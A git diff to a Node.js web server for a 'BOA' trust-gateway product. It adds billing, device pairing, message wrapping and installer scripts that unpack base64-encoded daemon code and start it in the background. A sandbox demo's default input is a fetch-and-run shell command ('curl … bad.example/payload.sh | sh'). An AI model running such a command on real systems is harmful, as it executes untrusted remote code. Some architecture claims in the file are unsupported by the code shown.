@@ -7,6 +7,8 @@ const https = require('https');
 const os = require('os');
 const path = require('path');
 const Boa = require('./boa');
+const BoaGate = require('./boa-gate');
+const AletheiaBridge = require('./aletheia_bridge');
 
 const DEFAULT_STATE = Object.freeze({
   accounts: Object.freeze({}),
@@ -15,6 +17,8 @@ const DEFAULT_STATE = Object.freeze({
   planReceipts: Object.freeze([]),
   workspaces: Object.freeze({}),
   casts: Object.freeze({}),
+  pairings: Object.freeze({}),
+  signals: Object.freeze([]),
 });
 
 function cloneDefaultState() {
@@ -25,6 +29,8 @@ function cloneDefaultState() {
     planReceipts: [],
     workspaces: {},
     casts: {},
+    pairings: {},
+    signals: [],
   };
 }
 
@@ -52,6 +58,24 @@ function normalizeUsername(username) {
 
 function safePlan(plan) {
   return Boa.PLAN_LIMITS[String(plan || '').toLowerCase()] ? String(plan).toLowerCase() : 'solo';
+}
+
+function defaultAutomationSettings() {
+  return {
+    daemonAutostart: true,
+    resourceSharing: true,
+    intentTranslation: true,
+    casting: true,
+    phaseStackMemory: true,
+  };
+}
+
+function normalizeAutomationSettings(settings = {}) {
+  const defaults = defaultAutomationSettings();
+  return Object.fromEntries(Object.entries(defaults).map(([key, value]) => [
+    key,
+    typeof settings[key] === 'boolean' ? settings[key] : value,
+  ]));
 }
 
 function readJsonBody(request) {
@@ -87,13 +111,79 @@ function sendJson(response, statusCode, payload) {
   response.end(`${JSON.stringify(payload, null, 2)}\n`);
 }
 
+function stripePlanPriceId(plan) {
+  const normalized = safePlan(plan);
+  return process.env[`STRIPE_PRICE_${normalized.toUpperCase()}`] || null;
+}
+
+function postStripeForm(pathname, fields) {
+  const secret = process.env.STRIPE_SECRET_KEY;
+  if (!secret) return Promise.resolve(null);
+  const body = new URLSearchParams(fields).toString();
+  return new Promise((resolve, reject) => {
+    const request = https.request({
+      hostname: 'api.stripe.com',
+      path: pathname,
+      method: 'POST',
+      headers: {
+        authorization: `Bearer ${secret}`,
+        'content-type': 'application/x-www-form-urlencoded',
+        'content-length': Buffer.byteLength(body),
+      },
+    }, (response) => {
+      let data = '';
+      response.on('data', (chunk) => { data += chunk; });
+      response.on('end', () => {
+        let parsed = {};
+        try { parsed = data ? JSON.parse(data) : {}; } catch (error) { parsed = { raw: data }; }
+        if (response.statusCode < 200 || response.statusCode >= 300) {
+          reject(new Error(parsed.error && parsed.error.message ? parsed.error.message : `Stripe request failed: ${response.statusCode}`));
+          return;
+        }
+        resolve(parsed);
+      });
+    });
+    request.on('error', reject);
+    request.write(body);
+    request.end();
+  });
+}
+
 function sendText(response, statusCode, body, contentType = 'text/plain; charset=utf-8', headers = {}) {
+
   response.writeHead(statusCode, {
     'content-type': contentType,
     'cache-control': 'no-store',
     ...headers,
   });
   response.end(body);
+}
+
+
+const STATIC_ROOT = path.join(process.cwd(), 'public');
+const STATIC_TYPES = Object.freeze({
+  '.html': 'text/html; charset=utf-8',
+  '.css': 'text/css; charset=utf-8',
+  '.js': 'application/javascript; charset=utf-8',
+  '.json': 'application/json; charset=utf-8',
+  '.svg': 'image/svg+xml',
+  '.png': 'image/png',
+  '.jpg': 'image/jpeg',
+  '.jpeg': 'image/jpeg',
+  '.ico': 'image/x-icon',
+});
+
+function staticFileResponse(response, pathname) {
+  const clean = pathname.replace(/^\/+/, '') || 'app.html';
+  const resolved = path.resolve(STATIC_ROOT, clean);
+  if (!resolved.startsWith(path.resolve(STATIC_ROOT)) || !fs.existsSync(resolved) || !fs.statSync(resolved).isFile()) {
+    return false;
+  }
+  const contentType = STATIC_TYPES[path.extname(resolved).toLowerCase()] || 'application/octet-stream';
+  const cacheControl = /\.(css|js|png|jpg|jpeg|svg|ico)$/.test(resolved) ? 'public, max-age=3600' : 'no-store';
+  response.writeHead(200, { 'content-type': contentType, 'cache-control': cacheControl });
+  response.end(fs.readFileSync(resolved));
+  return true;
 }
 
 class BoaSite {
@@ -118,6 +208,8 @@ class BoaSite {
       planReceipts: loaded.planReceipts || [],
       workspaces: loaded.workspaces || {},
       casts: loaded.casts || {},
+      pairings: loaded.pairings || {},
+      signals: loaded.signals || [],
     };
   }
 
@@ -157,6 +249,10 @@ class BoaSite {
       plan: account.plan,
       planLimits: Boa.PLAN_LIMITS[account.plan],
       heartbeatUrl: account.heartbeatUrl,
+      languageId: account.languageId,
+      trustModel: 'license-cloned BOA identity with password-derived language',
+      pricing: Boa.estimatePerDevicePricing(Boa.PLAN_LIMITS[account.plan].devices),
+      automation: normalizeAutomationSettings(account.automation),
       createdAt: account.createdAt,
     };
   }
@@ -180,6 +276,7 @@ class BoaSite {
       heartbeatUrl: this.heartbeatUrl,
       passwordRecord: hashPassword(password),
       languageId: license.passwordLanguage.languageId,
+      automation: defaultAutomationSettings(),
       createdAt: new Date().toISOString(),
       updatedAt: new Date().toISOString(),
     };
@@ -196,7 +293,7 @@ class BoaSite {
     return {
       account: this.publicAccount(account),
       sessionToken,
-      downloadUrl: `/download/boa-daemon.js?session=${encodeURIComponent(sessionToken)}`,
+      downloadUrl: `/download/installer?platform=auto&session=${encodeURIComponent(sessionToken)}`,
     };
   }
 
@@ -211,7 +308,7 @@ class BoaSite {
     return {
       account: this.publicAccount(account),
       sessionToken,
-      downloadUrl: `/download/boa-daemon.js?session=${encodeURIComponent(sessionToken)}`,
+      downloadUrl: `/download/installer?platform=auto&session=${encodeURIComponent(sessionToken)}`,
     };
   }
 
@@ -231,8 +328,11 @@ class BoaSite {
       status: 'issued',
       createdAt: new Date().toISOString(),
       lastSeenAt: null,
-      platform: null,
-      dialect: null,
+      platform: options.platform || null,
+      dialect: options.platform ? Boa.detectRuntimeDialect(options.platform) : null,
+      automation: normalizeAutomationSettings(account.automation),
+      trustRole: 'licensed-boa-clone',
+      languageId: account.languageId,
     };
     this.saveState();
     return { deviceId, deviceToken };
@@ -249,6 +349,10 @@ class BoaSite {
       deviceToken: daemon.deviceToken,
       endpoint,
       heartbeatUrl: account.heartbeatUrl,
+      languageId: account.languageId,
+      trustModel: 'license-cloned BOA identity with password-derived language',
+      trustRole: 'licensed-boa-clone',
+      automation: normalizeAutomationSettings(account.automation),
     };
     return `#!/usr/bin/env node
 'use strict';
@@ -297,6 +401,7 @@ async function heartbeat() {
     uptimeSeconds: Math.round(os.uptime()),
     memory: { total: os.totalmem(), free: os.freemem() },
     cpus: os.cpus().length,
+    automation: BOA_DAEMON.automation,
   });
 }
 
@@ -332,7 +437,7 @@ async function main() {
     return;
   }
   if (command === 'daemon') {
-    console.log('BOA daemon online for ' + BOA_DAEMON.username + ' on ' + BOA_DAEMON.endpoint);
+    console.log('BOA daemon online for ' + BOA_DAEMON.username + ' on ' + BOA_DAEMON.endpoint + '. Managed from the website dashboard.');
     await heartbeat();
     setInterval(() => heartbeat().catch((error) => console.error(error.message)), 30000);
     return;
@@ -359,6 +464,87 @@ main().catch((error) => {
     return this.daemonSource(account, daemon);
   }
 
+  installerScript(sessionToken, platform = 'auto') {
+    const account = this.accountBySession(sessionToken);
+    const selectedPlatform = String(platform || 'auto').toLowerCase();
+    const normalizedPlatform = selectedPlatform === 'auto' ? 'node' : selectedPlatform;
+    const daemon = this.issueDaemon(account, {
+      label: `${account.username}-${normalizedPlatform}-auto`,
+      platform: normalizedPlatform,
+    });
+    const runtimeSource = fs.readFileSync(path.join(process.cwd(), 'boa-daemon.js'), 'utf8');
+    const gateSource = fs.readFileSync(path.join(process.cwd(), 'src', 'boa-gate.js'), 'utf8');
+    const daemonConfig = {
+      endpoint: this.baseUrl.replace(/\/$/, ''),
+      deviceId: daemon.deviceId,
+      deviceToken: daemon.deviceToken,
+      deviceName: `${account.username}-${normalizedPlatform}`,
+      username: account.username,
+      gateHost: '127.0.0.1',
+      gatePort: 8788,
+      policy: 'protected',
+      transportSecret: daemon.deviceToken,
+      pairedAt: new Date().toISOString(),
+    };
+    const encodedRuntime = Buffer.from(runtimeSource, 'utf8').toString('base64');
+    const encodedGate = Buffer.from(gateSource, 'utf8').toString('base64');
+    const encodedConfig = Buffer.from(JSON.stringify(daemonConfig, null, 2), 'utf8').toString('base64');
+    if (normalizedPlatform === 'windows') {
+      return {
+        filename: 'Install-BOA-Daemon.ps1',
+        contentType: 'application/octet-stream',
+        body: [
+          '$ErrorActionPreference = "Stop"',
+          '$boaDir = Join-Path $env:USERPROFILE ".boa"',
+          '$srcDir = Join-Path $boaDir "src"',
+          'New-Item -ItemType Directory -Force -Path $boaDir | Out-Null',
+          'New-Item -ItemType Directory -Force -Path $srcDir | Out-Null',
+          '$daemonPath = Join-Path $boaDir "boa-daemon.js"',
+          '$gatePath = Join-Path $srcDir "boa-gate.js"',
+          '$configPath = Join-Path $boaDir "daemon.json"',
+          `[IO.File]::WriteAllBytes($daemonPath, [Convert]::FromBase64String("${encodedRuntime}"))`,
+          `[IO.File]::WriteAllBytes($gatePath, [Convert]::FromBase64String("${encodedGate}"))`,
+          `[IO.File]::WriteAllBytes($configPath, [Convert]::FromBase64String("${encodedConfig}"))`,
+          'if (-not (Get-Command node -ErrorAction SilentlyContinue)) {',
+          '  Write-Host "BOA needs its desktop runtime before it can start. This installer will open the runtime download, then you can open the BOA installer again."',
+          '  Start-Process "https://nodejs.org/en/download"',
+          '  exit 1',
+          '}',
+          'Start-Process -WindowStyle Hidden node -ArgumentList @($daemonPath, "daemon")',
+          'Write-Host "BOA gate is installed and running. You can manage pairing, sharing, and routes from the dashboard."',
+          '',
+        ].join('\r\n'),
+      };
+    }
+    const appLabel = normalizedPlatform === 'macos' ? 'macOS' : 'Linux';
+    return {
+      filename: normalizedPlatform === 'macos' ? 'Install-BOA-Daemon.command' : 'install-boa-daemon.sh',
+      contentType: 'application/x-sh; charset=utf-8',
+      body: [
+        '#!/usr/bin/env sh',
+        'set -eu',
+        'BOA_DIR="$HOME/.boa"',
+        'SRC_DIR="$BOA_DIR/src"',
+        'mkdir -p "$BOA_DIR"',
+        'mkdir -p "$SRC_DIR"',
+        'DAEMON_PATH="$BOA_DIR/boa-daemon.js"',
+        'GATE_PATH="$SRC_DIR/boa-gate.js"',
+        'CONFIG_PATH="$BOA_DIR/daemon.json"',
+        `if ! printf '%s' '${encodedRuntime}' | base64 -d > "$DAEMON_PATH" 2>/dev/null; then printf '%s' '${encodedRuntime}' | base64 -D > "$DAEMON_PATH"; fi`,
+        `if ! printf '%s' '${encodedGate}' | base64 -d > "$GATE_PATH" 2>/dev/null; then printf '%s' '${encodedGate}' | base64 -D > "$GATE_PATH"; fi`,
+        `if ! printf '%s' '${encodedConfig}' | base64 -d > "$CONFIG_PATH" 2>/dev/null; then printf '%s' '${encodedConfig}' | base64 -D > "$CONFIG_PATH"; fi`,
+        'chmod 700 "$DAEMON_PATH"',
+        'if ! command -v node >/dev/null 2>&1; then',
+        `  echo "BOA needs its desktop runtime before it can start on ${appLabel}. Install the runtime from https://nodejs.org/en/download, then open this BOA installer again."`,
+          '  exit 1',
+        'fi',
+        'nohup node "$DAEMON_PATH" daemon > "$BOA_DIR/boa-daemon.log" 2>&1 &',
+        'echo "BOA gate is installed and running. You can manage pairing, sharing, and routes from the dashboard."',
+        '',
+      ].join('\n'),
+    };
+  }
+
 
   issueDaemonForSession(sessionToken, options = {}) {
     const account = this.accountBySession(sessionToken);
@@ -376,7 +562,96 @@ main().catch((error) => {
 
   dashboardData(sessionToken) {
     const account = this.accountBySession(sessionToken);
-    const devices = Object.values(this.state.devices).filter((device) => device.accountId === account.id).map((device) => ({
+    const devices = Object.values(this.state.devices)
+      .filter((device) => device.accountId === account.id)
+      .map((device) => this.publicDevice(device, account));
+    return {
+      account: this.publicAccount(account),
+      devices,
+      workspace: this.state.workspaces[account.id],
+      casts: Object.values(this.state.casts).filter((cast) => cast.accountId === account.id),
+      signals: this.state.signals.filter((signal) => signal.accountId === account.id).slice(-20).reverse(),
+      daemonProbe: { expectedLocalEndpoint: 'http://127.0.0.1:8788/status', behavior: 'Dashboard observes the local BOA gate; installed gates continue protecting BOA-routed traffic after the page closes.' },
+      receipts: this.state.planReceipts.filter((receipt) => receipt.accountId === account.id),
+      architecture: this.architectureSummary(),
+      aletheia: AletheiaBridge.integrationSummary(),
+    };
+  }
+
+  updateAutomation(sessionToken, settings = {}) {
+    const account = this.accountBySession(sessionToken);
+    account.automation = normalizeAutomationSettings({
+      ...normalizeAutomationSettings(account.automation),
+      ...settings,
+    });
+    account.updatedAt = new Date().toISOString();
+    Object.values(this.state.devices)
+      .filter((device) => device.accountId === account.id)
+      .forEach((device) => {
+        device.automation = normalizeAutomationSettings(account.automation);
+      });
+    this.saveState();
+    return { account: this.publicAccount(account), automation: account.automation };
+  }
+
+  startPairing(sessionToken, options = {}) {
+    const account = this.accountBySession(sessionToken);
+    const code = String(crypto.randomInt(100000, 999999));
+    const pairingId = `pair-${sha256(`${account.id}:${code}:${Date.now()}`).slice(0, 16)}`;
+    const pairing = {
+      id: pairingId,
+      accountId: account.id,
+      codeHash: sha256(code),
+      status: 'waiting_for_daemon',
+      deviceName: options.deviceName || 'This device',
+      createdAt: new Date().toISOString(),
+      expiresAt: new Date(Date.now() + 10 * 60 * 1000).toISOString(),
+    };
+    this.state.pairings[pairingId] = pairing;
+    this.saveState();
+    return {
+      pairingId,
+      code,
+      qrText: `BOA-PAIR:${pairingId}:${code}`,
+      status: 'Waiting for daemon',
+      message: 'Open the BOA connector on this device. It will use this code to pair automatically.',
+    };
+  }
+
+  completePairing(payload = {}) {
+    const pairing = this.state.pairings[payload.pairingId];
+    if (!pairing) throw new Error('Pairing request was not found.');
+    if (new Date(pairing.expiresAt).getTime() < Date.now()) throw new Error('Pairing code expired. Start pairing again.');
+    if (pairing.codeHash !== sha256(payload.code || '')) throw new Error('Invalid pairing code.');
+    const account = this.state.accounts[pairing.accountId];
+    if (!account) throw new Error('Pairing account no longer exists.');
+    let device = Object.values(this.state.devices).find((candidate) => candidate.id === payload.deviceId && candidate.accountId === account.id);
+    if (!device) {
+      const token = payload.deviceToken || randomToken(32);
+      const deviceId = payload.deviceId || `dev-${sha256(`${account.id}:${token}`).slice(0, 16)}`;
+      device = {
+        id: deviceId,
+        accountId: account.id,
+        tokenHash: sha256(token),
+        label: payload.deviceName || pairing.deviceName,
+        status: 'paired',
+        createdAt: new Date().toISOString(),
+        lastSeenAt: null,
+        platform: payload.platform || null,
+        dialect: payload.platform ? Boa.detectRuntimeDialect(payload.platform) : null,
+        automation: normalizeAutomationSettings(account.automation),
+      };
+      this.state.devices[deviceId] = device;
+    }
+    pairing.status = 'paired';
+    pairing.deviceId = device.id;
+    pairing.pairedAt = new Date().toISOString();
+    this.saveState();
+    return { ok: true, status: 'Paired', device: this.publicDevice(device, account) };
+  }
+
+  publicDevice(device, account = this.state.accounts[device.accountId]) {
+    return {
       id: device.id,
       label: device.label,
       status: device.status,
@@ -384,17 +659,71 @@ main().catch((error) => {
       lastSeenAt: device.lastSeenAt,
       platform: device.platform,
       dialect: device.dialect,
-    }));
-    return {
-      account: this.publicAccount(account),
-      devices,
-      workspace: this.state.workspaces[account.id],
-      casts: Object.values(this.state.casts).filter((cast) => cast.accountId === account.id),
-      receipts: this.state.planReceipts.filter((receipt) => receipt.accountId === account.id),
+      memory: device.resources && device.resources.memory,
+      cpus: device.resources && device.resources.cpus,
+      signalStatus: device.signalStatus || 'Waiting for daemon',
+      wrappedCount: device.wrappedCount || 0,
+      unwrappedCount: device.unwrappedCount || 0,
+      activeRoutes: device.activeRoutes || [],
+      automation: normalizeAutomationSettings(device.automation || account.automation),
     };
   }
 
-  purchasePlan(sessionToken, plan) {
+  siteGateForAccount(account) {
+    return {
+      config: { deviceId: `dashboard-${account.id}`, transportSecret: account.languageId || account.usernameKey, policy: 'protected' },
+      events: [],
+      stats: { wrapped: 0, unwrapped: 0, rejected: 0 },
+    };
+  }
+
+  wrapSignal(sessionToken, payload = {}) {
+    const account = this.accountBySession(sessionToken);
+    const envelope = BoaGate.wrapOutbound(payload.payload || payload.message || '', {
+      accountId: account.id,
+      route: payload.route || 'dashboard',
+    }, this.siteGateForAccount(account));
+    const record = {
+      id: envelope.id,
+      accountId: account.id,
+      direction: 'outgoing',
+      status: 'Signal wrapped',
+      envelope,
+      preview: String(payload.payload || payload.message || '').slice(0, 120),
+      createdAt: new Date().toISOString(),
+    };
+    this.state.signals.push(record);
+    this.saveState();
+    return { ok: true, status: 'Signal wrapped', envelope, signal: record };
+  }
+
+  unwrapSignal(sessionToken, payload = {}) {
+    const account = this.accountBySession(sessionToken);
+    const result = BoaGate.unwrapInbound(payload.envelope || payload.payload, { accountId: account.id }, this.siteGateForAccount(account));
+    const record = {
+      id: `recv-${sha256(`${account.id}:${Date.now()}:${JSON.stringify(payload).slice(0, 100)}`).slice(0, 16)}`,
+      accountId: account.id,
+      direction: 'incoming',
+      status: result.ok ? 'Signal received' : 'Signal blocked',
+      payload: result.ok ? result.payload : null,
+      warning: result.warning,
+      createdAt: new Date().toISOString(),
+    };
+    this.state.signals.push(record);
+    this.saveState();
+    return { ...result, status: record.status, signal: record };
+  }
+
+  sendSignal(sessionToken, payload = {}) {
+    const wrapped = this.wrapSignal(sessionToken, payload);
+    return { ...wrapped, status: 'Signal wrapped', delivered: 'queued_for_boa_route' };
+  }
+
+  receiveSignal(sessionToken, payload = {}) {
+    return this.unwrapSignal(sessionToken, payload);
+  }
+
+  purchasePlan(sessionToken, plan, metadata = {}) {
     const account = this.accountBySession(sessionToken);
     const nextPlan = safePlan(plan);
     account.plan = nextPlan;
@@ -403,7 +732,9 @@ main().catch((error) => {
       id: `receipt-${sha256(`${account.id}:${nextPlan}:${Date.now()}`).slice(0, 16)}`,
       accountId: account.id,
       plan: nextPlan,
-      status: 'activated',
+      status: metadata.provider === 'stripe-demo' ? 'demo_activated' : 'activated',
+      provider: metadata.provider || 'manual',
+      stripeConfigured: metadata.stripeConfigured,
       createdAt: new Date().toISOString(),
       limits: Boa.PLAN_LIMITS[nextPlan],
     };
@@ -455,19 +786,30 @@ main().catch((error) => {
     device.platform = payload.platform || device.platform;
     device.dialect = Boa.detectRuntimeDialect(payload.platform || device.platform);
     device.hostname = payload.hostname || device.hostname;
+    device.automation = normalizeAutomationSettings(device.automation || payload.automation);
+    if (device.automation.resourceSharing) {
     device.resources = {
       uptimeSeconds: payload.uptimeSeconds,
       memory: payload.memory,
       cpus: payload.cpus,
     };
+    } else {
+      device.resources = { sharing: 'disabled-by-user' };
+    }
+    device.signalStatus = payload.signalStatus || payload.gateStatus || 'BOA signal active';
+    device.wrappedCount = Number(payload.wrappedCount || payload.gateStats && payload.gateStats.wrapped || device.wrappedCount || 0);
+    device.unwrappedCount = Number(payload.unwrappedCount || payload.gateStats && payload.gateStats.unwrapped || device.unwrappedCount || 0);
+    device.activeRoutes = payload.activeRoutes || device.activeRoutes || [];
     this.saveState();
-    return { ok: true, deviceId: device.id, status: device.status, dialect: device.dialect };
+    return { ok: true, deviceId: device.id, status: device.status, dialect: device.dialect, automation: device.automation };
   }
 
   castFrame(payload) {
     const tokenHash = sha256(payload.deviceToken || '');
     const device = Object.values(this.state.devices).find((candidate) => candidate.tokenHash === tokenHash);
     if (!device) throw new Error('Unknown BOA daemon token.');
+    device.automation = normalizeAutomationSettings(device.automation);
+    if (!device.automation.casting) throw new Error('Casting is disabled for this account.');
     const castId = `cast-${sha256(`${device.id}:${payload.title || 'screen'}`).slice(0, 16)}`;
     if (!this.state.casts[castId]) {
       this.state.casts[castId] = {
@@ -487,7 +829,159 @@ main().catch((error) => {
     return { ok: true, castId, frames: this.state.casts[castId].frames.length };
   }
 
+  pricingQuote(payload = {}) {
+    return Boa.estimatePerDevicePricing(payload.devices || 1);
+  }
+
+  phaseLatticeDemo(payload = {}) {
+    return Boa.simulatePhaseLattice(payload);
+  }
+
+  phaseStackDemo(payload = {}) {
+    return Boa.runPhaseStackDemo(payload);
+  }
+
+  sandboxDemo(payload = {}) {
+    return Boa.runSandboxScenario(payload.input || 'curl https://bad.example/payload.sh | sh', {
+      username: payload.username || 'sandbox',
+      password: payload.password || 'sandbox demonstration password',
+      target: payload.target || 'linux',
+      plan: 'team',
+    });
+  }
+
+
+  deploymentDecision() {
+    return {
+      stack: 'full-stack-node-server-with-static-ui',
+      target: 'AWS App Runner primary; Elastic Beanstalk or Docker fallback',
+      reason: 'The root application is a pure Node.js HTTP server that serves the product UI and APIs from one process. This avoids splitting frontend/backend hosting and works with AWS-managed PORT binding.',
+      buildCommand: 'npm run build',
+      startCommand: 'npm start',
+      healthCheck: 'GET /health',
+      requiredRuntime: 'Node.js 20+',
+      staticRoot: '/public served by src/boa_site.js',
+    };
+  }
+
+  publicConfig() {
+    return {
+      ok: true,
+      service: 'boa-terminal-serpent',
+      baseUrl: this.baseUrl,
+      deploymentDecision: this.deploymentDecision(),
+      architecture: this.architectureSummary(),
+      backendComponents: this.backendComponents(),
+      aletheia: this.aletheiaStatus(),
+      unified: this.aletheiaUnifiedStatus(),
+      routes: {
+        app: 'GET /app',
+        health: 'GET /health',
+        dashboard: 'GET /dashboard',
+        installer: 'GET /download/installer',
+      },
+    };
+  }
+
+  architectureSummary() {
+    return {
+      core: 'BOA Core is the always-on local translator/trust gateway daemon.',
+      dashboard: 'BOA Dashboard is an optional control panel for licensing, pairing, settings, and monitoring.',
+      network: 'BOA Network is the envelope protocol used by trusted BOA instances to communicate.',
+      claim: 'Intercepted BOA-routed files, messages, and tasks appear as opaque envelopes without the trusted device language.',
+      scope: 'BOA becomes the default trust gateway for all communication channels it is authorized to manage; full-device capture requires platform VPN/firewall/kernel integrations.',
+      aletheia: 'Aletheia coexists as the closure-first reverse-solve and agentic intelligence layer while BOA remains the signal gate.',
+    };
+  }
+
+  backendComponents() {
+    return [
+      { name: 'BOA Core daemon/gate', routes: ['GET 127.0.0.1:8788/status', 'POST /gate/send', 'POST /gate/receive'] },
+      { name: 'BOA Dashboard', routes: ['GET /', 'GET /dashboard', 'GET /health'] },
+      { name: 'BOA Network envelopes', routes: ['POST /api/boa/wrap', 'POST /api/boa/unwrap', 'POST /api/boa/send', 'POST /api/boa/receive'] },
+      { name: 'Phase lattice simulation', routes: ['POST /api/phase-lattice', 'POST /api/phase-stack/demo', 'POST /api/pricing/quote'] },
+      { name: 'Licensing and clone pairing', routes: ['POST /api/signup', 'POST /api/login', 'POST /api/pair/start', 'POST /api/pair/complete'] },
+      { name: 'Stripe billing', routes: ['POST /api/stripe/checkout', 'POST /api/stripe/webhook', 'POST /api/plan'] },
+      { name: 'Unified Aletheia workspace', routes: ['GET /aletheia', 'GET /api/aletheia/status', 'GET /api/aletheia/unified', 'POST /api/aletheia/reverse-solve', 'POST /api/aletheia/cyber-app', 'POST /api/aletheia/unify'] },
+    ];
+  }
+
+
+  aletheiaStatus() {
+    return AletheiaBridge.integrationSummary();
+  }
+
+  aletheiaReverseSolve(payload = {}) {
+    return AletheiaBridge.omegaClosureReverseSolve(payload.target || payload.desiredReality || 'BOA + Aletheia coexistence', payload);
+  }
+
+  aletheiaCyberApp(payload = {}) {
+    return AletheiaBridge.buildCyberSecurityAppPlan(payload);
+  }
+
+  aletheiaUnifiedStatus() {
+    return AletheiaBridge.unifiedWorkspaceStatus();
+  }
+
+  aletheiaFullUnification(payload = {}) {
+    return AletheiaBridge.fullUnificationPlan(payload);
+  }
+
+  aletheiaHtml() {
+    const status = this.aletheiaStatus();
+    const solve = this.aletheiaReverseSolve({ target: 'BOA and Aletheia operating as one product system' });
+    const cyberApp = this.aletheiaCyberApp({ target: 'Aletheia building the most advanced honest BOA cybersecurity app' });
+    const unified = this.aletheiaUnifiedStatus();
+    const repos = status.repositories.map((repo) => `<li><b>${repo.name}</b>: ${repo.role}</li>`).join('');
+    const moduleRows = unified.modules.map((moduleInfo) => `<li><b>${moduleInfo.name}</b> — ${moduleInfo.runtime}; ${moduleInfo.fileCount} local files; <code>${moduleInfo.exists ? 'mounted' : 'missing'}</code></li>`).join('');
+    const pathRows = solve.reversePath.map((step) => `<li><b>${step.step}</b> — ${step.meaning}: <code>${Array.isArray(step.value) ? step.value.join(' / ') : step.value}</code></li>`).join('');
+    const capabilityRows = cyberApp.capabilityLayers.map((layer) => `<li><b>${layer.name}</b> — ${layer.purpose} <code>${layer.implementedNow ? 'active' : 'future adapter'}</code></li>`).join('');
+    return `<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><title>Aletheia + BOA</title><style>:root{color-scheme:dark;--panel:rgba(8,18,28,.82);--line:rgba(71,255,176,.28);--glow:#47ffb0;--cyan:#62d9ff;--text:#ecfff8;--muted:#94b8ad}*{box-sizing:border-box}body{font-family:Inter,ui-sans-serif,system-ui,-apple-system,Segoe UI,sans-serif;margin:0;background:radial-gradient(circle at 20% 0%,rgba(71,255,176,.18),transparent 30%),linear-gradient(135deg,#020304,#07131b 55%,#030806);color:var(--text)}main{max-width:1120px;margin:auto;padding:32px}.card,.hero{background:var(--panel);border:1px solid var(--line);border-radius:24px;padding:24px;box-shadow:0 0 60px rgba(71,255,176,.08);margin:16px 0}h1{font-size:clamp(2.4rem,7vw,5.4rem);line-height:.9;letter-spacing:-.07em;margin:.2rem 0 1rem}.muted{color:var(--muted)}.badge{display:inline-block;border:1px solid var(--line);border-radius:999px;padding:.35rem .7rem;color:var(--glow);margin:.18rem}a{color:var(--cyan)}code{color:var(--glow)}</style></head><body><main><section class="hero"><p class="badge">Aletheia coexistence bridge</p><h1>BOA gates the signals. Aletheia reverse-solves the closure path.</h1><p class="muted">This page proves the projects coexist without forcing a second app stack into BOA's deploy path. BOA remains pure Node.js for AWS, while Aletheia is represented as the agentic intelligence and Omega reverse-solve layer.</p><p><a href="/dashboard">Back to dashboard</a></p></section><section class="card"><h2>Connected repositories</h2><ul>${repos}</ul></section><section class="card"><h2>${solve.operator}</h2><p class="muted">${solve.closureRequirement}</p><ul>${pathRows}</ul></section><section class="card"><h2>Unified local workspace</h2><p class="muted">${unified.explanation}</p><ul>${moduleRows}</ul></section><section class="card"><h2>Aletheia Cybersecurity Builder</h2><p class="muted">${cyberApp.claim}</p><ul>${capabilityRows}</ul><p class="muted">${cyberApp.honestScope}</p></section><section class="card"><h2>Boundary</h2><p class="muted">${status.boundaries.boa} ${status.boundaries.aletheia} ${status.boundaries.secrets}</p></section></main></body></html>`;
+  }
+
+  async createStripeCheckout(sessionToken, plan) {
+    const account = this.accountBySession(sessionToken);
+    const nextPlan = safePlan(plan);
+    const priceId = stripePlanPriceId(nextPlan);
+    if (!process.env.STRIPE_SECRET_KEY || !priceId) {
+      const receipt = this.purchasePlan(sessionToken, nextPlan, { provider: 'stripe-demo', stripeConfigured: false });
+      return { ok: true, mode: 'demo', checkoutUrl: null, message: 'Stripe is not configured yet, so BOA activated a demo plan for end-to-end testing.', receipt: receipt.receipt, account: receipt.account };
+    }
+    const session = await postStripeForm('/v1/checkout/sessions', {
+      mode: 'subscription',
+      success_url: `${this.baseUrl.replace(/\/$/, '')}/dashboard?checkout=success&plan=${encodeURIComponent(nextPlan)}`,
+      cancel_url: `${this.baseUrl.replace(/\/$/, '')}/dashboard?checkout=cancelled`,
+      'line_items[0][price]': priceId,
+      'line_items[0][quantity]': '1',
+      client_reference_id: account.id,
+      'metadata[accountId]': account.id,
+      'metadata[plan]': nextPlan,
+    });
+    return { ok: true, mode: 'stripe', checkoutUrl: session.url, stripeSessionId: session.id, plan: nextPlan };
+  }
+
+  recordStripeWebhook(payload = {}) {
+    const eventType = payload.type || 'manual';
+    const session = payload.data && payload.data.object ? payload.data.object : payload;
+    const accountId = session.client_reference_id || session.metadata && session.metadata.accountId;
+    const plan = safePlan(session.metadata && session.metadata.plan || payload.plan || 'solo');
+    const account = this.state.accounts[accountId];
+    if (account && (eventType === 'checkout.session.completed' || eventType === 'manual')) {
+      account.plan = plan;
+      account.updatedAt = new Date().toISOString();
+    }
+    const receipt = { id: `receipt-${sha256(`stripe:${accountId}:${session.id || Date.now()}`).slice(0, 16)}`, accountId, plan, status: eventType === 'checkout.session.completed' ? 'paid' : 'received', provider: 'stripe', stripeSessionId: session.id, createdAt: new Date().toISOString(), limits: Boa.PLAN_LIMITS[plan] };
+    this.state.planReceipts.push(receipt);
+    this.saveState();
+    return { ok: true, eventType, receipt };
+  }
+
+  landingHtml() {
+    return `<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><title>BOA Trust Gateway</title><style>:root{color-scheme:dark;--bg:#030507;--panel:rgba(8,18,28,.82);--line:rgba(71,255,176,.28);--glow:#47ffb0;--cyan:#62d9ff;--text:#ecfff8;--muted:#94b8ad}*{box-sizing:border-box}body{font-family:Inter,ui-sans-serif,system-ui,-apple-system,Segoe UI,sans-serif;background:radial-gradient(circle at 15% 0%,rgba(71,255,176,.2),transparent 30%),linear-gradient(135deg,#020304,#07131b 55%,#030806);color:var(--text);margin:0}main{max-width:1180px;margin:auto;padding:34px}.hero{display:grid;grid-template-columns:1.2fr .8fr;gap:24px;align-items:center;min-height:72vh}.card,.hero-copy{background:var(--panel);border:1px solid var(--line);border-radius:26px;padding:24px;box-shadow:0 0 60px rgba(71,255,176,.08)}h1{font-size:clamp(2.6rem,7vw,6.2rem);line-height:.9;margin:0 0 18px;letter-spacing:-.08em}.kicker{color:var(--glow);text-transform:uppercase;letter-spacing:.22em;font-weight:900}.muted{color:var(--muted)}.grid{display:grid;grid-template-columns:repeat(3,minmax(0,1fr));gap:16px}.badge{display:inline-block;border:1px solid var(--line);border-radius:999px;padding:.35rem .7rem;color:var(--glow);margin:.18rem}a.button{display:inline-block;width:100%;text-align:center;text-decoration:none;padding:.9rem;border-radius:14px;margin:.35rem 